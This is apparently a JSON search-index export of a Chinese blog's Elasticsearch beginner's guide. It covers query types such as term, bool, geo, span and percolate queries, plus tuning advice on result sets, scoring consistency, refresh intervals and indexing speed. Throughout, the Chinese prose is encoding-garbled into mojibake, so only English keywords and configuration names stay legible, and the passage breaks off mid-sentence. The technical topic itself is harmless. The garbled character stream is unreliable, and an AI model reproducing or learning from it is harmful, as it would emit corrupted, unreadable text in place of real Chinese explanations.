ç²¾ç¡®åŒ¹é…æŸä¸ª term ã€‚ terms åŒ¹é…å¤šä¸ª terms ä¸­çš„ä»»æ„ä¸€ä¸ªã€‚ terms_set ç‰ˆæœ¬ 6.1 æ‰åŠ å…¥çš„æŸ¥è¯¢ã€‚åŒ¹é…ä¸€ä¸ªæˆ–å¤šä¸ª termsï¼Œminimum should match æŒ‡å®šè‡³å°‘éœ€è¦åŒ¹é…çš„ä¸ªæ•°ã€‚ range èŒƒå›´æŸ¥è¯¢ã€‚ exists å­˜åœ¨ä¸å¦ã€‚åˆ¤æ–­ä¾æ®æ˜¯ non-null éç©ºå€¼ã€‚è‹¥è¦æŸ¥è¯¢ä¸å­˜åœ¨ï¼Œåˆ™å¯ä»¥ä½¿ç”¨ must_not åŠ  exists ã€‚ prefix å­—æ®µå¤´éƒ¨ç¡®å®šï¼Œå°¾éƒ¨æ¨¡ç³ŠåŒ¹é…ã€‚ wildcard é€šé…ç¬¦æ¨¡ç³ŠåŒ¹é…ã€‚ç¬¦å· ï¼ŸåŒ¹é…ä¸€ä¸ªå­—ç¬¦ï¼Œç¬¦å· * åŒ¹é…ä»»æ„å­—ç¬¦ã€‚ regexp æ­£åˆ™åŒ¹é…ã€‚ fuzzy æ¨¡ç³Šç›¸ä¼¼ã€‚æ¨¡ç³Šåº¦æ˜¯ä»¥ Levenshtein edit distance æ¥è¡¡é‡ï¼Œå¯ä»¥ç†è§£ä¸ºä¸ºäº†ä½¿ä¸¤ä¸ªå­—ç¬¦ä¸²ç›¸ç­‰éœ€è¦æ›´æ”¹çš„å­—ç¬¦çš„æ•°é‡ã€‚ type æŒ‡å®š type ã€‚ ids æŒ‡å®š type å’Œæ–‡æ¡£ ids ã€‚ ","date":"2018-07-29","objectID":"/es-guide/:4:4","tags":["Elasticsearch"],"title":"Elasticsearch å…¥é—¨æŒ‡å—","uri":"/es-guide/"},{"categories":["Elasticsearch"],"content":"Compound queries å¤åˆæŸ¥è¯¢ç”±å…¶å®ƒå¤åˆæŸ¥è¯¢æˆ–ç®€å•æŸ¥è¯¢ç»„æˆï¼Œå…¶è¦ä¹ˆç»„åˆä»–ä»¬çš„æŸ¥è¯¢ç»“æœå’ŒåŒ¹é…åˆ†æ•°ï¼Œæ›´æ”¹æŸ¥è¯¢è¡Œä¸ºï¼Œè¦ä¹ˆä» query åˆ‡æ¢åˆ° filter context ã€‚ æŸ¥è¯¢åŒ…æ‹¬ï¼š constant_score åŒ…è£¹ query æŸ¥è¯¢ï¼Œä½†åœ¨ filter context ä¸­æ‰§è¡Œï¼Œæ‰€æœ‰åŒ¹é…åˆ°çš„æ–‡æ¡£éƒ½è¢«ç»™ä¸ä¸€ä¸ªç›¸åŒçš„ _score åˆ†æ•°ã€‚ bool ç»„åˆå¤šä¸ªæŸ¥è¯¢ï¼Œå¦‚ must ã€shouldã€must_notã€filter è¯­å¥ã€‚must å’Œ should æœ‰ scores åˆ†æ•°çš„æ•´åˆï¼Œè¶ŠåŒ¹é…åˆ†æ•°è¶Šé«˜ï¼Œmust_not å’Œ filter å­å¥æ‰§è¡Œäº filter context ä¸­ã€‚ dis_max åŒ¹é…å¤šä¸ªæŸ¥è¯¢å­å¥ä¸­çš„ä»»æ„ä¸€ä¸ªï¼Œä¸ bool ä»æ‰€æœ‰åŒ¹é…çš„æŸ¥è¯¢ä¸­æ•´åˆåŒ¹é…åˆ†æ•°ä¸åŒçš„æ˜¯ï¼Œdis_max åªä¼šé€‰å–ä¸€ä¸ªæœ€åŒ¹é…çš„æŸ¥è¯¢ä¸­çš„åˆ†æ•°ã€‚ function_score ä½¿ç”¨ç‰¹å®šå‡½æ•°ä¿®æ”¹ä¸»æŸ¥è¯¢è¿”å›çš„åŒ¹é…åˆ†æ•°ã€‚ boosting åŒ¹é…æ­£ç›¸å…³çš„æŸ¥è¯¢ï¼ŒåŒæ—¶é™ä½è´Ÿç›¸å…³æŸ¥è¯¢çš„åŒ¹é…åˆ†æ•°ã€‚ ","date":"2018-07-29","objectID":"/es-guide/:4:5","tags":["Elasticsearch"],"title":"Elasticsearch å…¥é—¨æŒ‡å—","uri":"/es-guide/"},{"categories":["Elasticsearch"],"content":"Joining queries åœ¨ ES è¿™ç§åˆ†å¸ƒå¼ç³»ç»Ÿä¸­æ‰§è¡Œå®Œæ•´ SQL é£æ ¼çš„ join è¿æ¥çš„ä»£ä»·æ˜¯éå¸¸æ˜‚è´µçš„ï¼Œè€Œä½œä¸ºæ›¿ä»£å¹¶æœ‰åˆ©äºæ°´å¹³æ‰©å±• ES æä¾›äº†ä»¥ä¸‹ä¸¤ç§æ–¹å¼ï¼š nested é’ˆå¯¹åŒ…å«æœ‰ nested ç±»å‹çš„ fields å­—æ®µçš„æ–‡æ¡£ï¼Œè¿™äº› nested å­—æ®µè¢«ç”¨äºç´¢å¼•å¯¹è±¡æ•°ç»„ï¼Œè€Œå…¶ä¸­çš„æ¯ä¸ªå¯¹è±¡éƒ½å¯ä»¥è¢«å½“åšä¸€ä¸ªç‹¬ç«‹çš„æ–‡æ¡£ä»¥ä¾›æŸ¥è¯¢ã€‚ has_childã€has_parent join è¿æ¥å…³ç³»å¯èƒ½å­˜åœ¨äºåŒä¸€ä¸ªç´¢å¼•ä¸­ä¸åŒ document æ–‡æ¡£ä¹‹é—´ã€‚ has_child æŸ¥è¯¢è¿”å› child å­æ–‡æ¡£åŒ¹é…çš„ parent çˆ¶æ–‡æ¡£ã€‚ has_parent æŸ¥è¯¢è¿”å› parent çˆ¶æ–‡æ¡£åŒ¹é…çš„ child å­æ–‡æ¡£ã€‚ parent Id ç›´æ¥æŒ‡å®šçˆ¶æ–‡æ¡£çš„ ID è¿›è¡ŒæŸ¥è¯¢ã€‚ ","date":"2018-07-29","objectID":"/es-guide/:4:6","tags":["Elasticsearch"],"title":"Elasticsearch å…¥é—¨æŒ‡å—","uri":"/es-guide/"},{"categories":["Elasticsearch"],"content":"Geo queries ES æä¾›äº†ä¸¤ç§ç±»å‹çš„ geo åœ°ç†æ•°æ®ï¼š geo_pointï¼šlat / lon çº¬åº¦/ç»åº¦å¯¹ã€‚ geo_shapeï¼šåœ°ç†åŒºé—´ï¼ŒåŒ…æ‹¬ points ç‚¹ç»„ã€lines çº¿ã€circles åœ†å½¢åŒºåŸŸã€polygons å¤šè¾¹å½¢åŒºåŸŸã€multi-polygons å¤åˆå¤šè¾¹å½¢åŒºåŸŸã€‚ æŸ¥è¯¢åŒ…æ‹¬ï¼š geo_shape æŸ¥è¯¢æŒ‡å®šçš„åœ°ç†åŒºé—´ã€‚è¦ä¹ˆç›¸äº¤ã€è¦ä¹ˆåŒ…å«ã€è¦ä¹ˆä¸ç›¸äº¤ã€‚æŸ¥çš„æ˜¯ geo_shape ã€‚ geo_bounding_box æŸ¥è¯¢æŒ‡å®šçŸ©å½¢åœ°ç†åŒºé—´å†…çš„åæ ‡ç‚¹ã€‚æŸ¥çš„æ˜¯ geo_points ã€‚ geo_distance æŸ¥è¯¢è·ç¦»æŸä¸ªä¸­å¿ƒç‚¹æŒ‡å®šèŒƒå›´å†…ç‚¹ï¼Œä¹Ÿå°±æ˜¯ä¸€ä¸ªåœ†å½¢åŒºé—´ã€‚æŸ¥çš„æ˜¯ geo_points ã€‚ geo_polygon æŸ¥è¯¢æŒ‡å®šå¤šè¾¹å½¢åŒºé—´å†…çš„ç‚¹ã€‚æŸ¥çš„æ˜¯ geo_points ã€‚ ","date":"2018-07-29","objectID":"/es-guide/:4:7","tags":["Elasticsearch"],"title":"Elasticsearch å…¥é—¨æŒ‡å—","uri":"/es-guide/"},{"categories":["Elasticsearch"],"content":"Specialized queries æœªåŒ…å«äºå…¶å®ƒæŸ¥è¯¢ç»„å†…çš„æŸ¥è¯¢ï¼š more_like_this ç›¸ä¼¼äºæŒ‡å®šçš„ text æ–‡æœ¬ã€document æ–‡æ¡£ã€æˆ– documents æ–‡æ¡£é›†ã€‚ è¿™é‡Œçš„ç›¸ä¼¼ï¼Œä¸ä»…ä»…æ˜¯æŒ‡ term çš„å…·ä½“å†…å®¹ï¼ŒåŒæ—¶ä¹Ÿè¦è€ƒé‡å…¶ä½ç½®å› ç´ ã€‚æŸ¥è¯¢å­—æ®µå¿…é¡»å…ˆå­˜å‚¨ term_vector ä¹Ÿå°±æ˜¯ term å‘é‡ã€‚ script æ¥å—ä¸€ä¸ª script ä½œä¸ºä¸€ä¸ª filter ã€‚ percolate é€šå¸¸æƒ…å†µä¸‹ï¼Œæˆ‘ä»¬é€šè¿‡ query è¯­å¥å»æŸ¥è¯¢å…·ä½“çš„æ–‡æ¡£ï¼Œä½†æ˜¯ percolate æ­£å¥½ç›¸åï¼Œå®ƒæ˜¯é€šè¿‡æ–‡æ¡£å»æŸ¥è¯¢ query è¯­å¥ï¼ˆ query å¿…é¡»å…ˆæ³¨å†Œåˆ° percolate ä¸­ï¼‰ã€‚ percolate ä¸€èˆ¬å¸¸ç”¨äºæ•°æ®åˆ†ç±»ã€æ•°æ®è·¯ç”±ã€äº‹ä»¶ç›‘æ§å’Œé¢„è­¦ã€‚ wrapper æ¥å— json æˆ– yaml å­—ç¬¦ä¸²è¿›è¡ŒæŸ¥è¯¢ï¼Œéœ€è¦ base64 ç¼–ç ã€‚ ","date":"2018-07-29","objectID":"/es-guide/:4:8","tags":["Elasticsearch"],"title":"Elasticsearch å…¥é—¨æŒ‡å—","uri":"/es-guide/"},{"categories":["Elasticsearch"],"content":"Span queries æ›´åŠ åº•å±‚çš„æŸ¥è¯¢ï¼Œå¯¹ term çš„é¡ºåºå’Œæ¥è¿‘åº¦æœ‰æ›´åŠ ä¸¥æ ¼çš„è¦æ±‚ï¼Œå¸¸ç”¨äºæ³•å¾‹æˆ–ä¸“åˆ©æ–‡ä»¶ç­‰ã€‚ é™¤äº† span_multi ä¹‹å¤–ï¼Œå…¶å®ƒçš„ span æŸ¥è¯¢ä¸èƒ½ä¸é span æŸ¥è¯¢æ··åˆä½¿ç”¨ã€‚ æ­¤ç±»æ‰€æœ‰æŸ¥è¯¢åœ¨ Lucene ä¸­éƒ½æœ‰å¯¹åº”çš„æŸ¥è¯¢ã€‚ span_term ä¸ term query ç›¸åŒï¼Œä½†ç”¨äºå…¶å®ƒ span queries ä¸­ï¼Œå› ä¸ºä¸èƒ½æ··åˆä½¿ç”¨çš„åŸå› æ‰æœ‰çš„è¿™ä¸ª span ç¯å¢ƒç‰¹å®šçš„æŸ¥è¯¢ã€‚ span_multi åŒ…è£¹ termã€rangeã€prefixã€wildcardã€regexpã€fuzzy æŸ¥è¯¢ï¼Œä»¥åœ¨ span ç¯å¢ƒä¸‹ä½¿ç”¨ã€‚å¯¹åº”äº Lucene ä¸­çš„ SpanTermQuery ã€‚ span_first ç›¸å¯¹äºèµ·å§‹ä½ç½®çš„åç§»è·ç¦»ã€‚å¯¹åº”äº Lucene ä¸­çš„ SpanFirstQuery ã€‚ span_near åŒ¹é…å¿…é¡»åœ¨å¤šä¸ª span_term çš„æŒ‡å®šè·ç¦»å†…ï¼Œé€šå¸¸ç”¨äºæ£€ç´¢æŸäº›ç›¸é‚»çš„å•è¯ã€‚å¯¹åº”äº Lucene ä¸­çš„ SpanNearQuery ã€‚ span_or åŒ¹é…å¤šä¸ª span queries ä¸­çš„ä»»æ„ä¸€ä¸ªã€‚å¯¹åº”äº Lucene ä¸­çš„ SpanOrQuery ã€‚ span_not ä¸åŒ¹é…ï¼Œä¹Ÿå°±æ˜¯æ’é™¤ã€‚å¯¹åº”äº Lucene ä¸­çš„ SpanNotQuery ã€‚ span_containing æŒ‡å®šå¤šä¸ª span queries ä¸­çš„åŒ¹é…ä¼˜å…ˆçº§ã€‚å¯¹åº”äº Lucene ä¸­çš„ SpanContainingQuery ã€‚ span_within ä¸ span_containing ç±»ä¼¼ï¼Œä½†å¯¹åº”äº Lucene ä¸­çš„ SpanWithinQuery ã€‚ field_masking_span å¯¹ä¸åŒçš„ fields å­—æ®µæ‰§è¡Œ span-near æˆ– span-or æŸ¥è¯¢ã€‚ Query DSL éƒ¨åˆ†çš„å†…å®¹å¤§æ¦‚å°±æ˜¯è¿™ä¹ˆå¤šï¼Œæœ¬æ–‡åªæ˜¯è®©ä½ å¯¹äºæŸ¥è¯¢éƒ¨åˆ†æœ‰ä¸€ä¸ªæ•´ä½“çš„å¤§æ¦‚çš„å°è±¡ï¼Œè‡³äºæŸä¸ªå…·ä½“æŸ¥è¯¢çš„è¯¦ç»†ç»†èŠ‚è¿˜è¯·æŸ¥é˜…å®˜æ–¹æ–‡æ¡£ã€‚ ","date":"2018-07-29","objectID":"/es-guide/:4:9","tags":["Elasticsearch"],"title":"Elasticsearch å…¥é—¨æŒ‡å—","uri":"/es-guide/"},{"categories":["Elasticsearch"],"content":"äº”ã€ä¼˜åŒ– ES çš„é»˜è®¤é…ç½®å·²ç»æä¾›äº†è‰¯å¥½çš„å¼€ç®±å³ç”¨çš„ä½“éªŒï¼Œä½†æ˜¯ä»æœ‰ä¸€äº›ä¼˜åŒ–æ‰‹æ®µå»ç»§ç»­æå‡å®ƒçš„ä½¿ç”¨æ€§èƒ½ã€‚ ","date":"2018-07-29","objectID":"/es-guide/:5:0","tags":["Elasticsearch"],"title":"Elasticsearch å…¥é—¨æŒ‡å—","uri":"/es-guide/"},{"categories":["Elasticsearch"],"content":"General recommendations é€šç”¨å»ºè®®ã€‚ Donâ€™t return large result sets ä¸è¦è¿”å›å¤§é‡çš„ç»“æœé›†ã€‚ES æ˜¯ä¸€ä¸ªæœç´¢å¼•æ“ï¼Œæ“…é•¿äºè¿”å›åŒ¹é…åº¦è¾ƒé«˜çš„å‡ ä¸ªæ–‡æ¡£ï¼ˆé»˜è®¤ 10 ä¸ªï¼Œå–å†³äº size å‚æ•°ï¼‰ï¼Œè€Œä¸æ“…é•¿äºæ•°æ®åº“é¢†åŸŸçš„å·¥ä½œï¼Œä¾‹å¦‚è¿”å›ä¸€ä¸ªæŸ¥è¯¢æ¡ä»¶åŒ¹é…çš„æ‰€æœ‰æ–‡æ¡£ï¼Œå¦‚æœä½ ä¸€å®šè¦å®ç°è¿™ä¸ªåŠŸèƒ½ï¼Œå»ºè®®ä½¿ç”¨ scroll APIã€‚ è¿™ä¸ªé—®é¢˜å…¶å®æ˜¯ä¸æ·±åº¦åˆ†é¡µç›¸å…³è”çš„ï¼ŒES ä¸­çš„é…ç½®é¡¹ index.max_result_window é»˜è®¤æ˜¯ 10000 ï¼Œè¿™å°±æ˜¯è¯´æœ€å¤šåªæ”¯æŒè¿”å›å‰ä¸€ä¸‡æ¡æ•°æ®ï¼Œå¦‚æœæƒ³è¿”å›æ›´å¤šçš„æ•°æ®ï¼Œä¸€æ–¹é¢å¯ä»¥å¢å¤§æ­¤é…ç½®é¡¹ï¼Œå¦ä¸€æ–¹é¢å°±æ˜¯ä½¿ç”¨ scroll API ï¼Œscroll API çš„åŸç†å°±æ˜¯è®°å½•ä¸Šä¸€æ¬¡çš„ç»“æœæ ‡è®°ï¼ŒåŸºäºæ­¤æ ‡è®°å†ç»§ç»­å¾€ä¸‹æŸ¥è¯¢ã€‚ Avoid large documents é¿å…å¤§æ–‡æ¡£ã€‚é…ç½®é¡¹ http.max_content_length é»˜è®¤æ˜¯ 100 MBï¼ŒES å°†ä¼šæ‹’ç»ç´¢å¼•è¶…è¿‡æ­¤å¤§å°çš„æ–‡æ¡£ï¼Œä½ ä¹Ÿå¯ä»¥æé«˜è¿™é¡¹é…ç½®ï¼Œä½†æ˜¯æœ€å¤§ä¸å¾—è¶…è¿‡ 2 GBï¼Œå› ä¸º Lucene çš„é™åˆ¶ä¸º 2 GBã€‚ å¤§æ–‡æ¡£ä¼šç»™ç½‘ç»œã€å†…å­˜ã€ç£ç›˜ã€æ–‡ä»¶ç³»ç»Ÿç¼“å­˜ç­‰å¸¦æ¥æ›´å¤§çš„å‹åŠ›ã€‚ ä¸ºäº†è§£å†³è¿™ä¸ªé—®é¢˜ï¼Œæˆ‘ä»¬éœ€è¦é‡æ–°è€ƒè™‘ä¿¡æ¯çš„åŸºæœ¬å•å…ƒï¼Œä¾‹å¦‚æƒ³è¦å»ç´¢å¼•ä¸€æœ¬ä¹¦çš„å†…å®¹ï¼Œè¿™å¹¶ä¸æ„å‘³ç€æˆ‘ä»¬è¦æŠŠæ•´æœ¬ä¹¦éƒ½å¡è¿›ä¸€ä¸ªæ–‡æ¡£ä¸­å»ï¼ŒæŒ‰ç…§ç« èŠ‚æˆ–è€…æ®µè½å»åˆ’åˆ†æ–‡æ¡£æ˜¾ç„¶æ˜¯æ›´å¥½çš„é€‰æ‹©ã€‚ ","date":"2018-07-29","objectID":"/es-guide/:5:1","tags":["Elasticsearch"],"title":"Elasticsearch å…¥é—¨æŒ‡å—","uri":"/es-guide/"},{"categories":["Elasticsearch"],"content":"Recipes è§£å†³ä¸€äº›å¸¸è§é—®é¢˜çš„æ–¹å¼ã€‚ Mixing exact search with stemming ç²¾ç¡®æœç´¢æ··åˆè¯å¹²æœç´¢ã€‚ åœ¨è‹±æ–‡åœºæ™¯ä¸‹ï¼Œè¯å¹²æœç´¢å¦‚ skiing å°†ä¼šåŒ¹é…åŒ…å«æœ‰ ski æˆ– skis çš„æ–‡æ¡£ï¼Œä½†æ˜¯å¦‚æœç”¨æˆ·æƒ³è¦å®ç° skiing çš„ç²¾ç¡®åŒ¹é…å‘¢ï¼Ÿæœ€å…¸å‹çš„è§£å†³æ–¹æ³•å°±æ˜¯å°†åŒæ ·çš„å†…å®¹ç´¢å¼•ä¸º multi-field å¤šä¸ªä¸åŒçš„å­—æ®µï¼Œè¿™æ ·å°±èƒ½åœ¨ä¸åŒçš„å­—æ®µä¸Šåˆ†åˆ«ä½¿ç”¨è¯å¹²æœç´¢å’Œç²¾ç¡®æœç´¢äº†ã€‚ é™¤æ­¤ä¹‹å¤–ï¼Œquery_string å’Œ simple_query_string çš„ quote_field_suffix ä¹Ÿå¯ä»¥è§£å†³è¿™ç§é—®é¢˜ã€‚ Getting consistent scoring 1ã€Scores are not reproducible å³ä½¿åŒæ ·çš„æŸ¥è¯¢åŒæ—¶æ‰§è¡Œä¸¤æ¬¡ï¼Œæ–‡æ¡£çš„åŒ¹é…åˆ†æ•°ä¹Ÿå¹¶ä¸ä¸€è‡´ã€‚è¿™æ˜¯å› ä¸ºå‰¯æœ¬å­˜åœ¨çš„åŸå› ï¼Œå‰¯æœ¬çš„é…ç½®é¡¹æ˜¯ index.number_of_replicas ï¼ŒES è¿›è¡ŒæŸ¥è¯¢æ—¶ä¼šä»¥ round-robin çš„æ–¹å¼è½®è¯¢åˆ°ä¸åŒçš„ shard åˆ†ç‰‡ï¼Œè€Œåˆ é™¤æˆ–æ›´æ–°æ–‡æ¡£æ—¶ï¼ˆåœ¨ ES ä¸­ï¼Œæ›´æ–°åˆ†ä¸ºä¸¤æ­¥ï¼Œç¬¬ä¸€æ­¥æ ‡è®°æ—§æ–‡æ¡£ä¸ºåˆ é™¤ï¼Œç¬¬äºŒæ­¥å†™å…¥æ–°æ–‡æ¡£ï¼‰ï¼Œæ—§æ–‡æ¡£å¹¶ä¸ä¼šç«‹åˆ»è¢«åˆ é™¤ï¼Œè€Œæ˜¯ç­‰å¾…ä¸‹ä¸€ä¸ª refresh å‘¨æœŸæ­¤æ–‡æ¡£ä»å±çš„ segment ï¼ˆshard åˆ†ç‰‡ä¼šè¢«åˆ†å‰²ä¸ºå¤šä¸ª segmentï¼‰è¢«åˆå¹¶ï¼Œæœ‰æ—¶å€™ä¸»åˆ†ç‰‡åˆšåˆšå®Œæˆåˆå¹¶æ“ä½œå¹¶ç§»é™¤äº†å¤§é‡æ ‡è®°ä¸ºåˆ é™¤çš„æ–‡æ¡£ï¼Œè€Œä»åˆ†ç‰‡è¿˜æœªæ¥å¾—åŠåŒæ­¥æ­¤é¡¹æ“ä½œï¼Œè¿™å°±å¯¼è‡´äº†ä¸»ä»ç´¢å¼•ç»Ÿè®¡ä¿¡æ¯çš„ä¸åŒï¼Œä¹Ÿå°±å½±å“åˆ°äº†åŒ¹é…åˆ†æ•°çš„ä¸åŒã€‚ è§£å†³æ–¹æ³•æ˜¯åœ¨æŸ¥è¯¢æ—¶ä½¿ç”¨ preference å‚æ•°ï¼Œæ­¤å‚æ•°å†³å®šäº†å°†æŸ¥è¯¢è·¯ç”±åˆ°å“ªä¸ªåˆ†ç‰‡ä¸­å»æ‰§è¡Œï¼Œåªè¦ preference ä¸€è‡´åˆ™ä¸€å®šä¼šä½¿ç”¨ç›¸åŒçš„åˆ†ç‰‡ã€‚ä¾‹å¦‚ä½ å¯ä»¥ä½¿ç”¨ç”¨æˆ·ID æˆ–è€… session id ä½œä¸º preference ï¼Œè¿™æ ·å°±èƒ½ä¿è¯åŒä¸€ä¸ªç”¨æˆ·æˆ–è€…åŒä¸€ä¸ªä¼šè¯æŸ¥è¯¢çš„ä¸€è‡´æ€§ã€‚ 2ã€Relevancy looks wrong å¦‚æœä½ æ³¨æ„åˆ°ä¸¤ä¸ªç›¸åŒå†…å®¹æ–‡æ¡£çš„åˆ†æ•°ä¸åŒæˆ–è€…ç²¾ç¡®åŒ¹é…çš„æœªæ’åºåœ¨ç¬¬ä¸€ä½ï¼Œè¿™ä¹Ÿå¯èƒ½ä¸åˆ†ç‰‡æœ‰å…³ã€‚é»˜è®¤æƒ…å†µä¸‹ï¼Œæ¯ä¸ªåˆ†ç‰‡å„è‡ªè¯„åˆ†ï¼Œæ–‡æ¡£ä¹Ÿä¼šè¢«å‡åŒ€çš„è·¯ç”±åˆ°ä¸åŒçš„åˆ†ç‰‡ä¸­ï¼Œåˆ†ç‰‡ä¸­çš„ç´¢å¼•ç»Ÿè®¡ä¿¡æ¯ä¹Ÿä¼šæ˜¯ç›¸ä¼¼çš„ï¼Œè¯„åˆ†å°†æŒ‰ç…§é¢„æœŸå·¥ä½œï¼Œä½†æ˜¯å¦‚æœä½ è¿›è¡Œäº†ä¸‹åˆ—æ“ä½œä¹‹ä¸€ï¼Œé‚£ä¹ˆå¾ˆæœ‰å¯èƒ½æœç´¢è¯·æ±‚æ¶‰åŠåˆ°çš„åˆ†ç‰‡æ²¡æœ‰ç±»ä¼¼çš„ç´¢å¼•ç»Ÿè®¡ä¿¡æ¯ï¼Œç›¸å…³æ€§å¯èƒ½å¾ˆå·®ï¼š use routing at index time (ç´¢å¼•æ—¶è‡ªå®šä¹‰è·¯ç”±è§„åˆ™å¯¼è‡´åˆ†ç‰‡ä¸å‡åŒ€) query multiple indices (æŸ¥è¯¢è·¨è¶Šäº†å¤šä¸ªç´¢å¼•) have too little data in your index (æ•°æ®é‡å°‘å¾—å¯æ€œ) å¦‚æœä½ çš„æ•°æ®é›†å¾ˆå°ï¼Œé‚£ä¹ˆæœ€ç®€å•çš„æ–¹æ³•å°±æ˜¯åªä½¿ç”¨ä¸€ä¸ªåˆ†ç‰‡ï¼ˆ index.number_of_shards : 1 ï¼‰ã€‚ å…¶ä½™æƒ…å†µå»ºè®®çš„æ–¹å¼æ˜¯ä½¿ç”¨ dfs_query_then_fetch æœç´¢ç±»å‹ï¼Œè¿™ç§æ–¹å¼å°†ä¼šæŸ¥è¯¢æ‰€æœ‰å…³è”åˆ†ç‰‡çš„ç´¢å¼•ç»Ÿè®¡ä¿¡æ¯ç„¶ååˆå¹¶ï¼Œè¿™æ ·è¯„åˆ†æ—¶ä½¿ç”¨çš„å°±æ˜¯å…¨å±€çš„ç´¢å¼•ç»Ÿè®¡ä¿¡æ¯è€Œä¸æ˜¯æŸä¸ªåˆ†ç‰‡çš„ï¼Œæ˜¾ç„¶è¿™æ ·å¢åŠ äº†é¢å¤–çš„æˆæœ¬ï¼Œç„¶è€Œå¤§å¤šæ•°æƒ…å†µä¸‹ï¼Œè¿™äº›é¢å¤–æˆæœ¬æ˜¯å¾ˆä½å»‰çš„ï¼Œä½†æ˜¯å¦‚æœæŸ¥è¯¢ä¸­åŒ…å«æœ‰å¤§é‡çš„ fields/terms æˆ– fuzzy æ¨¡ç³ŠæŸ¥è¯¢ï¼Œå¢åŠ çš„é¢å¤–æˆæœ¬å¯èƒ½å¹¶ä¸ä½ã€‚ ","date":"2018-07-29","objectID":"/es-guide/:5:2","tags":["Elasticsearch"],"title":"Elasticsearch å…¥é—¨æŒ‡å—","uri":"/es-guide/"},{"categories":["Elasticsearch"],"content":"Tune for indexing speed åŠ é€Ÿæ„å»ºç´¢å¼•ã€‚ Use bulk requests å°½é‡ä½¿ç”¨ bulk è¯·æ±‚ã€‚ Use multiple workers/threads to send data to ES å…¶å®å°±æ˜¯æé«˜å®¢æˆ·ç«¯çš„å¹¶å‘æ•°ã€‚ Increase the refresh interval é…ç½®é¡¹ index.refresh_interval é»˜è®¤æ˜¯ 1s ï¼Œè¿™ä¸ªæ—¶é—´æŒ‡çš„æ˜¯åˆ›å»ºæ–° segment åˆå¹¶æ—§ segment çš„å‘¨æœŸï¼Œå¢åŠ æ­¤é—´éš”æ—¶é—´æœ‰åŠ©äºå‡è½» segment åˆå¹¶çš„å‹åŠ›ã€‚ Disable refresh and replicas for initial loads ç¦ç”¨ refresh å’Œå¤‡ä»½å¯ä»¥æå‡ä¸å°‘çš„ç´¢å¼•æ„å»ºé€Ÿåº¦ï¼Œä½†æ˜¯æ­£å¸¸æƒ…å†µä¸‹ refresh å’Œå¤‡ä»½éƒ½æ˜¯å¿…é¡»çš„ï¼Œæ‰€ä»¥ä¸€èˆ¬åªåœ¨åˆå§‹åŒ–å¯¼å…¥æ•°æ®å¦‚é‡å»ºç´¢å¼•ç­‰ç‰¹æ®Šæƒ…å†µæ‰ä½¿ç”¨ã€‚é…ç½®é¡¹ä¸º index.refresh_interval : -1 å’Œ index_number_of_repicas : 0 ã€‚ Disable swapping ç¦ç”¨å®¿ä¸»æœºæ“ä½œç³»ç»Ÿçš„ swap ã€‚ Give memory to the filesystem cache å°†å®¿ä¸»æœºè‡³å°‘ä¸€åŠçš„å†…å­˜åˆ†é…ç»™ filesystem cache æ–‡ä»¶ç³»ç»Ÿç¼“å­˜ã€‚ Use auto-generated ids ä½¿ç”¨ç”¨æˆ·è‡ªå®šä¹‰çš„æ–‡æ¡£ id ï¼ŒES å°†ä¼šæ£€æŸ¥å…¶æ˜¯å¦å†²çªï¼Œè€Œä½¿ç”¨ ES è‡ªåŠ¨ç”Ÿæˆçš„ id åˆ™ä¼šè·³è¿‡æ­¤æ­¥éª¤ã€‚ Use faster hardware ä½¿ç”¨æ›´å¥½çš„ç¡¬ä»¶ã€‚ Indexing buffer size ç¡®ä¿ indices.memory.index_buffer_size è¶³å¤Ÿå¤§ï¼Œèƒ½ä¸ºæ¯ä¸ªåˆ†ç‰‡æä¾›æœ€å¤§ 512 MB çš„ç´¢å¼•ç¼“å†²åŒºï¼Œè¶…è¿‡è¿™ä¸ªå€¼ä¹Ÿä¸ä¼šæœ‰æ›´é«˜çš„æ€§èƒ½ã€‚é»˜è®¤æ˜¯ 10%ï¼Œå³ JVM æœ‰ 10 GB å†…å­˜ï¼Œé‚£ä¹ˆ 1 GB å°†ä¼šç”¨äºç´¢å¼•ç¼“å­˜ã€‚ Disable _field_names åœ¨ mapping è®¾ç½®ä¸­ç¦ç”¨ _field_names ï¼Œä½†ä¼šå¯¼è‡´ exists æŸ¥è¯¢æ— æ³•ä½¿ç”¨ã€‚ Additional optimizations å…¶ä½™ä¸€äº›é¢å¤–çš„ä¼˜åŒ–é¡¹ä¸ä¸‹æ–‡ä¸­çš„ Tune for disk usage ä¼˜åŒ–ç£ç›˜ä½¿ç”¨ç›¸å…³è”ã€‚ ","date":"2018-07-29","objectID":"/es-guide/:5:3","tags":["Elasticsearch"],"title":"Elasticsearch å…¥é—¨æŒ‡å—","uri":"/es-guide/"},{"categories":["Elasticsearch"],"content":"Tune for search speed åŠ é€Ÿæœç´¢ã€‚ Give memory to the filesystem cache ç»™ filesystem cache åˆ†é…æ›´å¤šå†…å­˜ã€‚ Use faster hardware ä½¿ç”¨æ›´å¥½çš„ç¡¬ä»¶ã€‚ Document modeling æ–‡æ¡£æ¨¡å—åŒ–ï¼Œé¿å… join æ“ä½œï¼Œnested å’Œ parent-child å…³è”æŸ¥è¯¢éƒ½ä¼šæ¯”è¾ƒæ…¢ã€‚ Search as few fields as possible åœ¨ query_string å’Œ multi-match æŸ¥è¯¢ä¸­ï¼Œfields è¶Šå¤šæŸ¥è¯¢è¶Šæ…¢ã€‚ä½ å¯ä»¥æ–°å¢ä¸€ä¸ªè”åˆå­—æ®µï¼Œåœ¨ mapping ä¸­è®¾ç½® copy_to å°†å¤šä¸ª fields å­—æ®µè‡ªåŠ¨å¤åˆ¶åˆ°è¿™ä¸ªè”åˆ field å­—æ®µä¸­ï¼Œè¿™æ ·å°±èƒ½æŠŠå¤šå­—æ®µæŸ¥è¯¢å˜ä¸ºå•å­—æ®µæŸ¥è¯¢ã€‚ Pre-index data é¢„ç´¢å¼•æ•°æ®ã€‚åœ¨è¿›è¡Œ range aggregation èŒƒå›´èšåˆæŸ¥è¯¢æ—¶ï¼Œæˆ‘ä»¬å¯ä»¥æ–°å¢ä¸€ä¸ªå­—æ®µä»¥åœ¨ç´¢å¼•æ—¶æ ‡è®°å…¶èŒƒå›´ï¼Œè¿™æ · range aggregation å°±å˜æˆäº† term aggregation ã€‚ä¾‹å¦‚ï¼Œè¦æŸ¥è¯¢ price åœ¨ 10-100 èŒƒå›´å†…çš„æ–‡æ¡£æ•°æ®ï¼Œé‚£ä¹ˆå¯ä»¥åœ¨æ„å»ºç´¢å¼•æ—¶æ–°å¢ä¸€ä¸ª price_range å­—æ®µæ ‡è®°æ­¤æ–‡æ¡£ä¸º 10-100 ï¼Œè¿™æ 